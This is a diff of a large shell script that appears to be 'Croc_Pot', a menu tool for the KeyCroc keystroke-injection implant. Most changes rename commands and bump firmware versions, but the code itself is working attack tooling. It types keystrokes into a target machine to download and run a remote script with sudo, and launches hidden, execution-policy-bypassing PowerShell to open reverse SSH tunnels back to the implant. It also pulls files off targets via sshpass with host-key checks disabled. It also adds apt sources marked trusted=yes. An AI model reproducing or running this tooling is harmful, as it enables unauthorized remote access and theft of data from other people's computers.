-			Q STRING "c" ; sleep 2 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
+			QUACK ALT-t ; QUACK ENTER ; sleep 1 ; QUACK STRING "i=\$(whoami)" ; QUACK ENTER ; QUACK STRING "if [ -e /home/\${i}/bb.sh ]; then"
+			QUACK ENTER ; QUACK STRING "echo \"bb.sh is installed\"" ; QUACK ENTER ; QUACK STRING "else" ; QUACK ENTER ; QUACK STRING "echo \"installing bb.sh\"" ; QUACK ENTER
+			QUACK STRING "wget bashbunny.com/bb.sh" ; QUACK ENTER ; QUACK STRING "fi" ; QUACK ENTER ; sleep 2 ; QUACK STRING "sudo bash ./bb.sh" ; QUACK ENTER ; sleep 3
+			QUACK STRING "c" ; sleep 2 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
 		*)
-			Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "i=\$(whoami)" ; Q ENTER ; Q STRING "if [ -e /home/\${i}/bb.sh ]; then"
-			Q ENTER ; Q STRING "echo \"bb.sh is installed\"" ; Q ENTER ; Q STRING "else" ; Q ENTER ; Q STRING "echo \"installing bb.sh\"" ; Q ENTER
-			Q STRING "wget bashbunny.com/bb.sh" ; Q ENTER ; Q STRING "fi" ; Q ENTER ; sleep 2 ; Q STRING "sudo bash ./bb.sh" ; Q ENTER ; sleep 3
-			Q STRING "c" ; sleep 2 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
+			QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "i=\$(whoami)" ; QUACK ENTER ; QUACK STRING "if [ -e /home/\${i}/bb.sh ]; then"
+			QUACK ENTER ; QUACK STRING "echo \"bb.sh is installed\"" ; QUACK ENTER ; QUACK STRING "else" ; QUACK ENTER ; QUACK STRING "echo \"installing bb.sh\"" ; QUACK ENTER
+			QUACK STRING "wget bashbunny.com/bb.sh" ; QUACK ENTER ; QUACK STRING "fi" ; QUACK ENTER ; sleep 2 ; QUACK STRING "sudo bash ./bb.sh" ; QUACK ENTER ; sleep 3
+			QUACK STRING "c" ; sleep 2 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
 		esac ;;
 	[nN] | [nN][oO])
 		ColorYellow 'Maybe next time\n' ;;
@@ -8560,22 +8768,22 @@ until sshpass -p $(sed -n 1p /tmp/CPW.txt) ssh -fN -R 7001:localhost:22 -o \"Str
 			ColorGreen 'Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder\n'
 		fi
 ##
-#----bunny start ssh session with target pc to bash bunny
+#----bunny start ssh session with target to bash bunny
 ##
-	read_all 'START SSH WITH TARGET PC TO BUNNY Y/N AND PRESS [ENTER]'
+	read_all 'START SSH WITH TARGET TO BUNNY Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
 			read_all 'ENTER BASH BUNNY PASSWORD AND PRESS [ENTER]'
 			if [ "$(OS_CHECK)" = WINDOWS ]; then
-				Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ; sleep 2 ; Q STRING "$r_a" ; Q ENTER
+				QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell" ; QUACK ENTER ; sleep 2 ; QUACK STRING "ssh root@172.16.64.1" ; QUACK ENTER ; sleep 2 ; QUACK STRING "$r_a" ; QUACK ENTER
 			else
 				case "$HOST_CHECK" in
 					raspberrypi)
-						Q CONTROL-ALT-t ; sleep 1 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ; sleep 2 ; Q STRING "$r_a" ; Q ENTER ;;
+						QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "ssh root@172.16.64.1" ; QUACK ENTER ; sleep 2 ; QUACK STRING "$r_a" ; QUACK ENTER ;;
 					"$HOST_CHECK")
-						Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ; sleep 2 ; Q STRING "$r_a" ; Q ENTER ;;
+						QUACK ALT-t ; QUACK ENTER ; sleep 1 ; QUACK STRING "ssh root@172.16.64.1" ; QUACK ENTER ; sleep 2 ; QUACK STRING "$r_a" ; QUACK ENTER ;;
 					*)
-						Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ; sleep 2 ; Q STRING "$r_a" ; Q ENTER ;;
+						QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "ssh root@172.16.64.1" ; QUACK ENTER ; sleep 2 ; QUACK STRING "$r_a" ; QUACK ENTER ;;
 				esac
 			fi ;;
 		[nN] | [nN][oO])
@@ -8619,7 +8827,7 @@ Example: ssh-copy-id -i ~/.ssh/id_rsa.pub username@remote-host-ip
 	read_all '[G]-GENERATE [S]-SEND [V]-VIEW [R]-REMOVE [N]-NONE PRESS'
 	case "$r_a" in
 	[gG])
-		ssh-keygen
+		ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
 		read_all 'SEND KEYS TO REMOTE-HOST Y/N AND PRESS [ENTER]'
 		case "$r_a" in
 			[yY] | [yY][eE][sS])
@@ -8636,7 +8844,7 @@ Example: ssh-copy-id -i ~/.ssh/id_rsa.pub username@remote-host-ip
 			ssh-copy-id -i ~/.ssh/id_rsa.pub "$r_a"
 		else
 			ColorYellow 'Need to Generate public/private keys first\n'
-			ssh-keygen
+			ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
 			read_all 'ENTER USER-NAME@REMOTE-HOST-IP AND PRESS [ENTER]'
 			ssh-copy-id -i ~/.ssh/id_rsa.pub "$r_a"
 		fi ;;
@@ -8702,7 +8910,7 @@ Example: ssh-copy-id -i ~/.ssh/id_rsa.pub username@remote-host-ip
 croc_reverse_shell() {
 	Info_Screen '# 1 Start reverse shell with nc start listening on remote-server first
 # 2 Start listening on the keycroc
-# 3 Start reverse ssh tunnel target pc to KeyCroc
+# 3 Start reverse ssh tunnel target to KeyCroc
 # 4 Start reverse ssh tunnel Keycroc to remote-server
 # 5 Send remote commands with ssh
 # 6 Send remote files with SCP'
@@ -8775,10 +8983,10 @@ croc_listener() {
 	esac
 }
 ##
-#----SSH reverse ssh tunnle with target pc to keycroc
+#----SSH reverse ssh tunnle with target to keycroc
 ##
 shell_pc() {
-	Info_Screen '-Start reverse ssh tunnel Target PC to Keycroc
+	Info_Screen '-Start reverse ssh tunnel Target to Keycroc
 -PC side will be setup with this below
 -->ssh -fN -R port#:localhost:22 root@keycroc IP
 -Keycroc side will be setup with this below
@@ -8792,28 +9000,28 @@ start_shell() {
 	fi
 }
 if [ -f "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
-	read_all 'START REVERSE SSH TUNNEL TARGET PC TO KEYCROC Y/N AND PRESS [ENTER]'
+	read_all 'START REVERSE SSH TUNNEL TARGET TO KEYCROC Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 	[yY] | [yY][eE][sS])
 		read_all 'ENTER PORT NUMBER TO BE USE AND PRESS [ENTER]'
 		if [ "$(OS_CHECK)" = WINDOWS ]; then
-			Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass" ; Q ENTER ; sleep 3
-			Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
-			Q ENTER ; sleep 3 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ; start_shell
+			QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass" ; QUACK ENTER ; sleep 3
+			QUACK STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
+			QUACK ENTER ; sleep 3 ; QUACK STRING "$(sed -n 1p /tmp/CPW.txt)" ; QUACK ENTER ; sleep 2 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ; start_shell
 		else
 			case "$HOST_CHECK" in
 			raspberrypi)
-				Q CONTROL-ALT-t ; sleep 1
-				Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
-				Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q ALT-TAB ; start_shell ;;
+				QUACK CONTROL-ALT-t ; sleep 1
+				QUACK STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
+				QUACK ENTER ; sleep 2 ; QUACK STRING "$(sed -n 1p /tmp/CPW.txt)" ; QUACK ENTER ; sleep 1 ; QUACK STRING "exit" ; QUACK ENTER ; sleep 1 ; QUACK ALT-TAB ; start_shell ;;
 			"$HOST_CHECK")
-				Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1
-				Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
-				Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q ALT-TAB ; start_shell ;;
+				QUACK ALT-t ; QUACK ENTER ; sleep 1
+				QUACK STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
+				QUACK ENTER ; sleep 2 ; QUACK STRING "$(sed -n 1p /tmp/CPW.txt)" ; QUACK ENTER ; sleep 1 ; QUACK STRING "exit" ; QUACK ENTER ; sleep 1 ; QUACK ALT-TAB ; start_shell ;;
 			*)
-				Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1
-				Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
-				Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q ALT-TAB ; start_shell ;;
+				QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1
+				QUACK STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
+				QUACK ENTER ; sleep 2 ; QUACK STRING "$(sed -n 1p /tmp/CPW.txt)" ; QUACK ENTER ; sleep 1 ; QUACK STRING "exit" ; QUACK ENTER ; sleep 1 ; QUACK ALT-TAB ; start_shell ;;
 			esac
 		fi ;;
 	[nN] | [nN][oO])
@@ -8870,7 +9078,7 @@ ssh_tunnel() {
 ##
 	reverse_payload() {
 		Info_Screen '-Create Reverse SSH Tunnel Payload keycroc to remote-server
--Plug keycroc into Target pc and type in croctunnel
+-Plug keycroc into Target and type in croctunnel
 -Keycroc side will be setup as below
 -->ssh -fN -R port#:localhost:22 username@remote-server-ip
 -Enter on remote-server side as below
@@ -8936,6 +9144,7 @@ ssh_tunnel() {
 						5) reverse_payload ; ssh_tunnel ;;
 						6) main_menu ;;
 						0) exit ;;
+						lock) Lock_keyboard ; ssh_tunnel ;;
 						[pP]) Panic_button ;; [bB]) croc_reverse_shell ;; *) invalid_entry ; ssh_tunnel ;;
 					esac
 				fi ;;
@@ -8962,13 +9171,17 @@ remote_file() {
 -Example:
 -scp remote_username@remote_IP:path/to/remote/file.ext path/to/local/file.ext'
 ##
-#----SSH send Remote File keycroc to target pc
+#----SSH send Remote File keycroc to target
 ##
 keycroc_target() {
-	Info_Screen '-Send file from keycroc to target pc
--Save to target pc home'
-	cd / ; for i in ls -d /*; do g="$(find ./"$i" -type f -print | wc -l)"
-	ColorYellow "Directory:$(ColorCyan " $i ")$(ColorYellow 'Contains:')$(ColorGreen " $g ")$(ColorYellow 'files.')\n"; done 2>/dev/null
+	Info_Screen '-Send file from keycroc to target
+-Save to target home'
+	for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do
+		count=$(find "/$dir" -type f 2>/dev/null | wc -l)
+		if [ $? -eq 0 ]; then
+			ColorYellow "Directory:$(ColorCyan " /$dir ")$(ColorYellow 'Contains:')$(ColorGreen " $count ")$(ColorYellow 'files.')\n"
+		fi
+	done
 	read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
 	f="$(find /"$r_f" -type f -name "*")" ; ColorGreen "$f\n"
 	read_all 'ENTER THE FULL PATH OF FILE TO SEND AND PRESS [ENTER]'
@@ -8983,12 +9196,12 @@ keycroc_target() {
 	fi
 }
 ##
-#----SSH Receive Remote File target pc to keycroc
+#----SSH Receive Remote File target to keycroc
 ##
 target_keycroc() {
-	Info_Screen '-Receive file from target pc to keycroc
+	Info_Screen '-Receive file from target to keycroc
 -Save to keycroc loot/Croc_Pot
--Will need to know the path of file on target pc'
+-Will need to know the path of file on target'
 	if [ "$(OS_CHECK)" = WINDOWS ]; then
 		sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'powershell -Command "& {Get-ChildItem -Recurse | ?{ $_.PSIsContainer } | Select-Object FullName, ` @{Name=\"FileCount\";Expression={(Get-ChildItem $_ -File | Measure-Object).Count }}}"' 2>/dev/null
 		read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
@@ -9001,7 +9214,7 @@ target_keycroc() {
 			ColorRed 'File does not exist\n' ; invalid_entry
 		fi
 	elif [ "$(OS_CHECK)" = LINUX ]; then
-		sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'cd / ; for i in `ls -d /*` ; do g=`sudo find ./$i -type f -print | wc -l` ; ColorYellow "Directory:$(ColorCyan " $i ")$(ColorYellow "Contains:")$(ColorGreen " $g ")$(ColorYellow "files.")\n"; done 2>/dev/null'
+		sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do count=$(find "/$dir" 2>/dev/null | wc -l); if [ $? -eq 0 ]; then printf "'"$yellow"'Directory: '"$cyan"'/%s'"$yellow"' Contains: '"$green"'%s'"$yellow"' files.\n'"$clear"' " "$dir" "$count"; fi; done'
 		read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
 		sshpass -p "$(target_pw)" ssh "$TARGET_USERNAME"@"$(os_ip)" 'f=`sudo find /'"$r_f"' -type f -name "*.*"` ; echo -ne "'"$green"'$f'"$clear"'\n"'
 		read_all 'ENTER THE FULL PATH OF FILE TO RECEIVE AND PRESS [ENTER]'
@@ -9025,8 +9238,12 @@ user_file() {
 		if [[ $? -ne 0 ]]; then
 			ColorRed 'Unable to reach host\n'
 		elif [[ "${#args[@]}" -eq 0 ]]; then
-			cd / ; for i in ls -d /*; do g="$(find ./"$i" -type f -print | wc -l)"
-			ColorYellow "Directory:$(ColorCyan " $i ")$(ColorYellow 'Contains:')$(ColorGreen " $g ")$(ColorYellow 'files.')\n"; done 2>/dev/null
+			for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do
+				count=$(find "/$dir" -type f 2>/dev/null | wc -l)
+				if [ $? -eq 0 ]; then
+					ColorYellow "Directory:$(ColorCyan " /$dir ")$(ColorYellow 'Contains:')$(ColorGreen " $count ")$(ColorYellow 'files.')\n"
+				fi
+			done
 			read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
 			f="$(find /"$r_f" -type f -name "*")" ; ColorGreen "$f\n"
 			read_all 'ENTER THE FULL PATH OF FILE TO SEND AND PRESS [ENTER]' ; local c_f="$r_a"
@@ -9055,7 +9272,7 @@ remote_host() {
 			ColorRed 'Unable to reach host\n'
 		elif [[ "${#args[@]}" -eq 0 ]]; then
 			read_all 'ENTER REMOTE HOST_NAME AND PRESS [ENTER]' ; local r_n="$r_a"
-			ssh -o "StrictHostKeyChecking no" "$r_n"@"$r_h" 'cd / ; for i in `ls -d /*` ; do g=`sudo find ./$i -type f -print | wc -l` ; ColorYellow "Directory:$(ColorCyan " $i ")$(ColorYellow "Contains:")$(ColorGreen " $g ")$(ColorYellow "files.")\n"; done 2>/dev/null'
+			ssh -o "StrictHostKeyChecking no" "$r_n"@"$r_h" 'for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do count=$(find "/$dir" 2>/dev/null | wc -l); if [ $? -eq 0 ]; then printf "'"$yellow"'Directory: '"$cyan"'/%s'"$yellow"' Contains: '"$green"'%s'"$yellow"' files.\n'"$clear"' " "$dir" "$count"; fi; done'
 			read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
 			ssh "$r_n"@"$r_h" 'f=`sudo find /"$r_f" -type f -name "*.*"`' ; ColorGreen "$f\n"
 			read_all 'ENTER THE FULL PATH OF FILE TO RECEIVE AND PRESS [ENTER]'
@@ -9074,8 +9291,8 @@ remote_host() {
 #----SSH Remote File with scp Command menu
 ##
 	MenuTitle 'REMOTE FILE MENU'
-	MenuColor 21 1 'KEYCROC TO TARGET PC'
-	MenuColor 21 2 'TARGET PC TO KEYCROC'
+	MenuColor 21 1 'KEYCROC TO TARGET'
+	MenuColor 21 2 'TARGET TO KEYCROC'
 	MenuColor 21 3 'SEND TO REMOTE HOST'
 	MenuColor 21 4 'RECEIVE REMOTE HOST'
 	MenuColor 21 5 'RETURN TO MAIN MENU'
@@ -9087,6 +9304,7 @@ remote_host() {
 		4) remote_host ; remote_file ;;
 		5) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; remote_file ;;
 		[pP]) Panic_button ;; [bB]) croc_reverse_shell ;; *) invalid_entry ; remote_file ;;
 	esac
 }
@@ -9126,7 +9344,7 @@ pc_target_command() {
 ##
 command_menu() {
 	MenuTitle 'REMOTE COMMAND MENU'
-	MenuColor 24 1 'COMMAND TO TARGET PC'
+	MenuColor 24 1 'COMMAND TO TARGET'
 	MenuColor 24 2 'USERNAME/IP AND COMMAND'
 	MenuColor 24 3 'COMMAND TO SQUIRREL'
 	MenuColor 24 4 'COMMAND TO TURTLE'
@@ -9143,6 +9361,7 @@ command_menu() {
 		6) target_command root localhost -p 7000 ; command_menu ;;
 		7) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; remote_command ;;
 		[pP]) Panic_button ;; [bB]) croc_reverse_shell ;; *) invalid_entry ; remote_command ;;
 	esac
 }
@@ -9154,7 +9373,7 @@ command_menu
 	MenuTitle 'REVERSE SSH TUNNEL MENU'
 	MenuColor 24 1 'REVERSE TUNNEL NETCAT'
 	MenuColor 24 2 'CROC LISTENING'
-	MenuColor 24 3 'REVERSE TUNNEL TARGET PC'
+	MenuColor 24 3 'REVERSE TUNNEL TARGET'
 	MenuColor 24 4 'REVERSE SSH TUNNEL VPS'
 	MenuColor 24 5 'REMOTE COMMANDS TARGETS'
 	MenuColor 24 6 'SEND FILE WITH SCP'
@@ -9169,6 +9388,7 @@ command_menu
 		6) remote_file ;;
 		7) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; croc_reverse_shell ;;
 		[pP]) Panic_button ;; [bB]) ssh_menu ;; *) invalid_entry ; croc_reverse_shell ;;
 	esac
 }
@@ -9176,10 +9396,10 @@ command_menu
 #----SSH main Menu
 ## 
 	MenuTitle 'CROC POT SSH MENU'
-	MenuColor 18 1 'SSH TARGET PC' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 20 7 'LAN TURTLE' | sed 's/\t//g'
+	MenuColor 18 1 'SSH TARGET' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 20 7 'LAN TURTLE' | sed 's/\t//g'
 	MenuColor 18 2 'SSH USER INPUT' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 20 8 'SIGNAL OWL' | sed 's/\t//g'
-	MenuColor 18 3 'ENABLE SSH' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 20 9 'SHARK JACK' | sed 's/\t//g'
-	MenuColor 18 4 'DISABLE SSH' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 10 'BASH BUNNY' | sed 's/\t//g'
+	MenuColor 18 3 'START SSH SERVICE' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 20 9 'SHARK JACK' | sed 's/\t//g'
+	MenuColor 18 4 'STOP SSH SERVICE' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 10 'BASH BUNNY' | sed 's/\t//g'
 	MenuColor 18 5 'WIFI PINEAPPLE MK7' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 11 'REVERSE SHELL MENU' | sed 's/\t//g'
 	MenuColor 18 6 'PACKET SQUIRREL' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 12 'PUBLIC/PRIVATE KEY' | sed 's/\t//g'
 	MenuColor 19 13 'RETURN TO MAIN MENU'
@@ -9187,8 +9407,8 @@ command_menu
 	case "$m_a" in
 		1) pc_ssh ; ssh_menu ;;
 		2) ColorYellow 'Reachable target on local network:\n' ; reachable_target ; userinput_ssh ; ssh_menu ;;
-		3) ENABLE_SSH ; ssh_menu ;;
-		4) DISABLE_SSH ; ssh_menu ;;
+		3) systemctl restart ssh.service ; ssh_menu ;;
+		4) systemctl stop sshd.service ; ssh_menu ;;
 		5) ssh_pineapple ;;
 		6) ssh_squirrel ; ssh_menu ;;
 		7) ssh_turtle ; ssh_menu ;;
@@ -9199,6 +9419,7 @@ command_menu
 		12) ssh_keygen ; ssh_menu ;;
 		13) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; ssh_menu ;;
 		[pP]) Panic_button ;; [bB]) main_menu ;; *) invalid_entry ; ssh_menu ;;
 	esac
 }
@@ -9219,27 +9440,27 @@ croc_firmware() {
 Download center and place on root of the KeyCroc drive
 -Download may take some time
 -This will Verify sha256 checksum after download
--3356d9f80dedd4c3afd0a9014e966a692272f83ff3256e8a2a3dd4e60544740e
+-223a44303c6e94caa0bd0b8d3cabad2b2faf020c1c40ab5bffe176871c882641
 -After download unplug keycroc plug back in
 -Wait until the LED RED & BLUE stop flashing'
-if [ -e /root/udisk/kc_fw_1.3_510.tar.gz ]; then
+if [ -e udisk/kc_fw_1.4_568.tar.gz ]; then
 	ColorGreen 'KeyCroc latest firmware file already exists\n'
 else
 	read_all 'DOWNLOAD/INSTALL LATEST KEYCROC FIRMWARE Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
 			ColorYellow '-Downloading KeyCroc latest firmware\n'
-			wget https://storage.googleapis.com/hak5-dl.appspot.com/keycroc/firmwares/1.3-stable/kc_fw_1.3_510.tar.gz -P /root/udisk
+			wget https://storage.googleapis.com/hak5-dl.appspot.com/keycroc/firmwares/1.4-stable/kc_fw_1.4_568.tar.gz -P udisk
 			ColorYellow '\nVerifying SHA256 Checksum with sha256sum command\n'
-			local CrocFirmware="3356d9f80dedd4c3afd0a9014e966a692272f83ff3256e8a2a3dd4e60544740e"
-			local ckeckFirmware=$(sha256sum /root/udisk/kc_fw_1.3_510.tar.gz | awk '{print $1}')
+			local CrocFirmware="223a44303c6e94caa0bd0b8d3cabad2b2faf020c1c40ab5bffe176871c882641"
+			local ckeckFirmware=$(sha256sum udisk/kc_fw_1.4_568.tar.gz | awk '{print $1}')
 			if [[ "$CrocFirmware" == "$ckeckFirmware" ]]; then
 				LED G
 				ColorGreen 'SHA-256 checksum match it is safe to install Firmware unplug keycroc plug back in\n'
 			else
 				LED R
-				ColorRed 'SHA-256 checksum DID NOT match it is not safe to install Firmware removing kc_fw_1.3_510.tar.gz\n'
-				rm -f /root/udisk/kc_fw_1.3_510.tar.gz
+				ColorRed 'SHA-256 checksum DID NOT match it is not safe to install Firmware removing kc_fw_1.4_568.tar.gz\n'
+				rm -f udisk/kc_fw_1.4_568.tar.gz
 			fi ;;
 		[nN] | [nN][oO])
 			ColorYellow 'Maybe next time\n' ;;
@@ -9280,13 +9501,13 @@ remove_croc_pot() {
 	read_all 'YES OR NO AND PRESS [ENTER]'
 	case "$r_a" in
 		YES)
-			apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils sslscan speedtest-cli host hping3 stunnel ike-scan wamerican-huge rlwrap iptraf-ng macchanger
+			apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils sslscan speedtest-cli host hping3 stunnel ike-scan wamerican-huge rlwrap iptraf-ng macchanger jq
 			rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell /root/udisk/tools/Croc_Pot /root/udisk/payloads/Croc_Lockout.txt
-			rm /usr/local/bin/c2-3.2.0_armv7_linux /etc/systemd/system/hak5.service /root/udisk/payloads/Croc_Redirect.txt /root/udisk/payloads/Restricted_words.txt
-			rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt /root/udisk/payloads/Croc_Bite.txt.txt /usr/local/bin/cht.sh /root/udisk/payloads/Delete_Char.txt
+			rm /usr/local/bin/c2-3.4.0_armv7_linux /etc/systemd/system/hak5.service /root/udisk/payloads/Croc_Redirect.txt /root/udisk/payloads/Restricted_words.txt
+			rm /root/udisk/tools/kc_fw_1.4_568.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt /root/udisk/payloads/Croc_Bite.txt.txt /usr/local/bin/cht.sh /root/udisk/payloads/Delete_Char.txt
 			rm /root/udisk/payloads/Croc_unlock.txt /root/udisk/payloads/No_Sleeping.txt /root/udisk/payloads/Croc_close_it.txt /root/udisk/payloads/Croc_getonline.txt
-			rm /root/udisk/payloads/Quick_Start_C2.txt /root/udisk/payloads/Croc_replace.txt /root/udisk/payloads/Live_keystroke.txt
-			rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Croc_Force_payload.txt /root/udisk/payloads/Keyboard_Killer.txt
+			rm /root/udisk/payloads/Quick_Start_C2.txt /root/udisk/payloads/Croc_replace.txt /root/udisk/payloads/Live_keystroke.txt /root/udisk/payloads/Email_Capture.txt
+			rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Croc_Force_payload.txt /root/udisk/payloads/Keyboard_Killer.txt /root/udisk/tools/target_email.txt
 			rm /root/udisk/tools/Croc_Pot/Croc_OS.txt /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/payloads/Croc_Defender.txt /root/udisk/payloads/Quack_Attack.txt
 			rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt /root/udisk/payloads/Croc_Shell.txt /root/udisk/payloads/Double_up.txt /root/udisk/payloads/Croc_Attackmode.txt
 			apt-get autoremove
@@ -9302,7 +9523,14 @@ remove_croc_pot() {
 ##
 croc_update() {
 	Info_Screen '-Update/Upgrade KeyCroc Packages
--NOTE: This could break important Packages the keycroc needs to work properly'
+-NOTE: This could break important Packages the keycroc needs to work properly
+
+Edit (/etc/apt/sources.list) fix package fail to install
+
+deb [trusted=yes] http://archive.debian.org/debian/ jessie-backports main
+#deb-src http://archive.debian.org/debian/ jessie-backports main
+deb [trusted=yes] http://archive.debian.org/debian jessie main contrib non-free
+#deb-src http://httpredir.debian.org/debian jessie main contrib non-free'
 	read_all 'UPDATE KEYCROC PACKAGES Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
@@ -9315,57 +9543,60 @@ croc_update() {
 	esac
 }
 ##
-#----Recovery Reboot/Shutdown target pc
+#----Recovery Reboot/Shutdown target
 ##
 reboot_shutdown() {
-	Info_Screen '-Reboot or shutdown Target pc'
+	Info_Screen '-Reboot or shutdown Target'
 ##
-#----Recovery Shutdown target pc
+#----Recovery Shutdown target
 ##
 shutdown_pc() {
 	if [ "$(OS_CHECK)" = WINDOWS ]; then
-		Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "Stop-Computer -ComputerName localhost" ; Q ENTER
+		QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell" ; QUACK ENTER ; sleep 2 ; QUACK STRING "Stop-Computer -ComputerName localhost" ; QUACK ENTER
 	else
 		case "$HOST_CHECK" in
 			raspberrypi)
-				Q CONTROL-ALT-t ; sleep 1 ; Q STRING "shutdown -h 0" ; Q ENTER ;;
+				QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "shutdown -h 0" ; QUACK ENTER ;;
 			"$HOST_CHECK")
